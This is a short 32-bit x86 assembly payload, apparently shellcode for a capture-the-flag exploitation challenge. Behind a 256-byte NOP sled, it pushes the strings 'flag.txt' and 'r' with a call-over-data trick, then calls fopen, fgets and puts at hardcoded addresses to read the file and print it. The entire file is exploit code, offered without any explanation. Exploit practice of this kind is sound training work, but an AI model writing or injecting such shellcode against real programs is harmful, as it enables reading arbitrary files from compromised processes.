[bits 32]
times 256 nop

call l1
    db "r", 0
l1:
call l2
    db "flag.txt", 0
l2:
mov eax, 0x8050170  ; fopen
call eax

push eax
push 64
push 0x80DC11C  ; buffer
mov eax, 0x8052660  ; fgets
call eax

push 0x80DC11C  ; buffer
mov eax, 0x8050320  ;puts
call eax

nop
